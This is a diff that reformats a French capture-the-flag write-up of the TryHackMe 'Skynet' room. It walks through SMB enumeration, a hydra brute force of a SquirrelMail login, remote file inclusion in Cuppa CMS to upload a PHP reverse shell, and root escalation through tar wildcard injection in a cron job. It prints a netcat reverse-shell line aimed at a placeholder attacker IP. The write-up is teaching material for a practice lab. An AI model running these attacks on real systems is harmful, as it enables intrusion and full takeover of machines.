@@ -1,59 +1,14 @@
+<div align="center">
 
-  
+# **WriteUp/Guide [FR] - TryHackMe : Skynet**
 
-![tryhackme__skynet-0.png](images/tryhackme__skynet-0.png)
+</div>
 
+**Author:** [Damien D.](https://fr.linkedin.com/in/damien-d-9816121a9)
 
-  
+---
 
-WriteUp/Guide [FR] - TryHackMe : Skynet 
-
-
-
-
-
-
-
-
- 
-
- 
-
-  
-
-
-
-[
-
-              
-          
-        Damien D.
-      
-      
-          
-](https://fr.linkedin.com/in/damien-d-9816121a9)
-![tryhackme__skynet-1.png](images/tryhackme__skynet-1.png)
-
-  
-            
-        Damien D.
-      
-          
- 
- 
-
-                
-          Published Nov 19, 2025
-              
-              
-  
-
-[
-              + Follow
-            ](https://www.linkedin.com/signup/cold-join?session_redirect=%2Fpulse%2Fwriteupguide-fr-tryhackme-skynet-damien-depaepe-kyvbe%2F%3FtrackingId%3DeQ2Hq%252F7%252FgOAOjZMaCuQqLw%253D%253D&trk=article-ssr-frontend-pulse_publisher-author-card)
-
-
-
+![skynet-0.png](images/skynet-0.png)
 
 
 J'avais beaucoup aimé la room dédiée à Goldeneye alors autant poursuivre avec un autre des films de mon enfance avec la room Skynet consacrée à Terminator ! 
@@ -64,7 +19,7 @@ Une fois l'ip obtenue, on tombe sur une page skynet qui semble être un moteur d
 
 
 
-![tryhackme__skynet-2.png](images/tryhackme__skynet-2.png)
+![skynet-1.png](images/skynet-1.png)
   
 Rien du côté de F12 non plus, je lance un scan gobuster, sait-on jamais. 
 
@@ -79,7 +34,7 @@ Et on y trouve une page de login pour un service mail. N'ayant rien sous la main
 
 
 
-![tryhackme__skynet-3.png](images/tryhackme__skynet-3.png)
+![skynet-2.png](images/skynet-2.png)
   
 Je passe à Nmap qui devrait nous en dire plus. J'active les scipts avec -C et comme d'habitude, je crée un fichier pour garder les résultats de mon scan. 
 
@@ -94,7 +49,7 @@ On trouve pas mal de pistes, notamment du smb et même un nom d'utilisateur : gu
 
 
 
-![tryhackme__skynet-4.png](images/tryhackme__skynet-4.png)
+![skynet-3.png](images/skynet-3.png)
   
 On va pouvoir explorer ce serveur smb grâce à smbmap et ce nom d'utilisateur. 
 
@@ -105,13 +60,13 @@ smbmap -u guest -H 10.10.139.7 -P 445
 ```
 
 
-![tryhackme__skynet-5.png](images/tryhackme__skynet-5.png)
+![skynet-4.png](images/skynet-4.png)
   
 Et on trouve un dossier anonymous ainsi qu'un nom //familier : Miles Dyson ! 
 
 
 
-![tryhackme__skynet-6.png](images/tryhackme__skynet-6.png)
+![skynet-5.png](images/skynet-5.png)
   
 Je me connecte ensuite au serveur avec ce compte guest, il n'y a pas besoin de mot de passe 
 
@@ -126,25 +81,25 @@ On y trouve deux choses : un fichier texte que je télécharge et un dossier log
 
 
 
-![tryhackme__skynet-7.png](images/tryhackme__skynet-7.png)
+![skynet-6.png](images/skynet-6.png)
   
-![tryhackme__skynet-8.png](images/tryhackme__skynet-8.png)
+![skynet-7.png](images/skynet-7.png)
   
 Apparemment, il y a eu un problème concernant les mots de passe, pas impossible qu'on en apprenne plus en lisant les logs. 
 
 
 
-![tryhackme__skynet-9.png](images/tryhackme__skynet-9.png)
+![skynet-8.png](images/skynet-8.png)
   
 Je les ai téléchargés tous les trois mais je n'avais pas fait attention aux tailles des fichiers : seul le log1.txt contient des infos : une liste qui pourrait bien être une liste de mots de passe. On sait aussi qu'on a un utilisateur qui sera probablement miles ou milesdyson. Il est temps de revenir à la page de connexion  squirrelmail. 
 
 
 
-![tryhackme__skynet-10.png](images/tryhackme__skynet-10.png)
+![skynet-9.png](images/skynet-9.png)
   
 
 
-What is Miles password for his emails? 
+*What is Miles password for his emails?* 
 
  
 
@@ -159,15 +114,15 @@ hydra -L ./users.txt -P ./log1.txt 10.10.139.7 http-post-form "/squirrelmail/src
 ```
 
 
-![tryhackme__skynet-11.png](images/tryhackme__skynet-11.png)
+![skynet-10.png](images/skynet-10.png)
   
 En se connectant à la messagerie, on trouve 3 mails (SENT et DRAFT sont vides). Le premier contient ce qu'on cherchait : le nouveau mot de passe. 
 
 
 
-![tryhackme__skynet-12.png](images/tryhackme__skynet-12.png)
+![skynet-11.png](images/skynet-11.png)
   
-Les deux autres mails reprennent une phrase en boucle (le premier mail est en binaire mais un passage par Cyberchef plus tard et on retrouve la même chose) : balls have zero to me to me to me to me to me to me to me to me to. Je n'avais pas la réf donc je suis allé chercher et c'est tiré d'un échange entre deux IA de Facebook qui se seraient mises à communiquer dans un language qu'elles auraient co-créé. Dans une room comme celle-ci, rien d'étonnant, on joue sur le concept de singularité. Plus sérieusement, il y a eu un gros emballement sur cette histoire finalement pas si intéressante. Voici un lien qui résume bien les choses : [https://www.lemonde.fr/pixels/article/2017/08/01/non-facebook-n-a-pas-panique-a-cause-d-un-programme-d-ia-capable-d-inventer-un-langage_5167480_4408996.html](https://www.linkedin.com/redir/redirect?url=https%3A%2F%2Fwww%2Elemonde%2Efr%2Fpixels%2Farticle%2F2017%2F08%2F01%2Fnon-facebook-n-a-pas-panique-a-cause-d-un-programme-d-ia-capable-d-inventer-un-langage_5167480_4408996%2Ehtml&urlhash=CZ8y&trk=article-ssr-frontend-pulse_little-text-block) 
+Les deux autres mails reprennent une phrase en boucle (le premier mail est en binaire mais un passage par Cyberchef plus tard et on retrouve la même chose) : *balls have zero to me to me to me to me to me to me to me to me to. *Je n'avais pas la réf donc je suis allé chercher et c'est tiré d'un échange entre deux IA de Facebook qui se seraient mises à communiquer dans un language qu'elles auraient co-créé. Dans une room comme celle-ci, rien d'étonnant, on joue sur le concept de singularité. Plus sérieusement, il y a eu un gros emballement sur cette histoire finalement pas si intéressante. Voici un lien qui résume bien les choses : [https://www.lemonde.fr/pixels/article/2017/08/01/non-facebook-n-a-pas-panique-a-cause-d-un-programme-d-ia-capable-d-inventer-un-langage_5167480_4408996.html](https://www.linkedin.com/redir/redirect?url=https%3A%2F%2Fwww%2Elemonde%2Efr%2Fpixels%2Farticle%2F2017%2F08%2F01%2Fnon-facebook-n-a-pas-panique-a-cause-d-un-programme-d-ia-capable-d-inventer-un-langage_5167480_4408996%2Ehtml&urlhash=CZ8y&trk=article-ssr-frontend-pulse_little-text-block) 
 
 
 
@@ -175,11 +130,11 @@ Retour donc au serveur SMB avec le mot de passe du compte milesdyson. Plusieurs 
 
 
 
-![tryhackme__skynet-13.png](images/tryhackme__skynet-13.png)
+![skynet-12.png](images/skynet-12.png)
   
 
 
-What is the hidden directory? 
+*What is the hidden directory?* 
 
  
 
@@ -189,17 +144,17 @@ Dans ce dossier, pas mal de fichiers mais un seul ne respecte pas la nomenclatur
 
 
 
-![tryhackme__skynet-14.png](images/tryhackme__skynet-14.png)
+![skynet-13.png](images/skynet-13.png)
   
-![tryhackme__skynet-15.png](images/tryhackme__skynet-15.png)
+![skynet-14.png](images/skynet-14.png)
   
 Et on trouve l'endpoint qu'on nous demandait. Il nous oriente vers une page personnelle où on parle de Miles au passé... Rien de plus mais c'est sans doute un nouveau point de départ pour de l'énumération. 
 
 
 
-![tryhackme__skynet-16.png](images/tryhackme__skynet-16.png)
+![skynet-15.png](images/skynet-15.png)
   
-![tryhackme__skynet-17.png](images/tryhackme__skynet-17.png)
+![skynet-16.png](images/skynet-16.png)
   
 En se rendant sur la page administrator, on se retrouve de nouveau devant une page de login mais cette fois, les mots de passe (ancien et nouveau) ne donne rien. Mais la page du challenge nous donne une indication. 
 
@@ -207,7 +162,7 @@ En se rendant sur la page administrator, on se retrouve de nouveau devant une pa
 
 
 
-What is the vulnerability called when you can include a remote file for malicious purposes? 
+*What is the vulnerability called when you can include a remote file for malicious purposes?* 
 
  
 
@@ -221,7 +176,7 @@ En cherchant cuppa cms sur exploitdb, on tombe sur un exploit qui correspond à 
 
 
 
-![tryhackme__skynet-18.png](images/tryhackme__skynet-18.png)
+![skynet-17.png](images/skynet-17.png)
   
 Pour ce qui est du reverse shell en php, il est trouvable ici : [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://www.linkedin.com/redir/redirect?url=https%3A%2F%2Fpentestmonkey%2Enet%2Ftools%2Fweb-shells%2Fphp-reverse-shell&urlhash=_FJq&trk=article-ssr-frontend-pulse_little-text-block) 
 
@@ -231,7 +186,7 @@ Il ne reste qu'à le mettre à jour avec la bonne ip et le port d'écoute.
 
 
 
-![tryhackme__skynet-19.png](images/tryhackme__skynet-19.png)
+![skynet-18.png](images/skynet-18.png)
   
 Ensuite, on prépare un serveur python depuis le dossier où est hébergé le fichier et en parallèle un nectcat en écoute sur le port qu'on a indiqué dans notre fichier php. 
 
@@ -251,11 +206,11 @@ Et nous y voilà !
 
 
 
-![tryhackme__skynet-20.png](images/tryhackme__skynet-20.png)
+![skynet-19.png](images/skynet-19.png)
   
 
 
-What is the user flag? 
+*What is the user flag?* 
 
  
 
@@ -265,15 +220,15 @@ Et on peut récupérer le flag user.txt
 
 
 
-![tryhackme__skynet-21.png](images/tryhackme__skynet-21.png)
+![skynet-20.png](images/skynet-20.png)
   
 Quant à l'ascension de privilèges, il y a de quoi faire dans les crontabs avec un script qui se lance chaque minute en root. 
 
 
 
-![tryhackme__skynet-22.png](images/tryhackme__skynet-22.png)
+![skynet-21.png](images/skynet-21.png)
   
-![tryhackme__skynet-23.png](images/tryhackme__skynet-23.png)
+![skynet-22.png](images/skynet-22.png)
   
 Le script n'est pas modifiable mais il a une faille.  
 
@@ -314,13 +269,13 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER IP> <PORT> >/tmp
 ```
 
 
-![tryhackme__skynet-24.png](images/tryhackme__skynet-24.png)
+![skynet-23.png](images/skynet-23.png)
   
 La première ligne donne le pas des checkpoints : à chaque ajout dans l'archive. La seconde fabrique le payload et crée le fichier shell qui va être exécuté. La dernière donne l'action à exécuter à chaque étape du checkpoint : exec=sh signifie que c'est le shell (en root donc) qui va lancer mon shell qui contient un reverse vers ma machine. 
 
 
 
-![tryhackme__skynet-25.png](images/tryhackme__skynet-25.png)
+![skynet-24.png](images/skynet-24.png)
   
 Très chouette room avec un final certes technique mais bon à connaitre parce que finalement très mécanique. J'ai mis pas mal de temps à comprendre le fonctionnement de tout ça mais il y a pas mal de blogs qui donnent plus ou moins d'explications ainsi que des vidéos sur youtube si vous avez un peu de mal à saisir le fonctionnement. Pour le reste, rien d'insurmontable mais pas mal de petites étapes à franchir notamment côté SMB. 
 
